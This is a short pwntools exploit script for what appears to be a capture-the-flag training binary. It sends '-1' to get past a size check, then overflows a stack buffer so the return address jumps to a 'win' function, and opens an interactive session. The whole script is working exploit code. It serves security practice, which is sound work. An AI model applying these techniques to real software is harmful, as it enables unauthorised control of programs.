#!/usr/bin/python3

from pwn import *
import time

context.log_level = 'error'
context.arch = "amd64"

elf = context.binary = ELF('/challenge/bounds-breaker-easy')

rbp_addr = 0x7fff89c12480
input_start  = rbp_addr - 0x80
return_addr = rbp_addr + 8
overflow_size = return_addr - input_start
win_addr = 0x0000000000402424

io = process()

size = 113

encoded_size = size.to_bytes(4,"little",signed=True)
payload = cyclic(overflow_size) + p64(win_addr)
print(encoded_size)
io.sendline(b"-1")

time.sleep(1)

io.send(payload)

io.interactive()
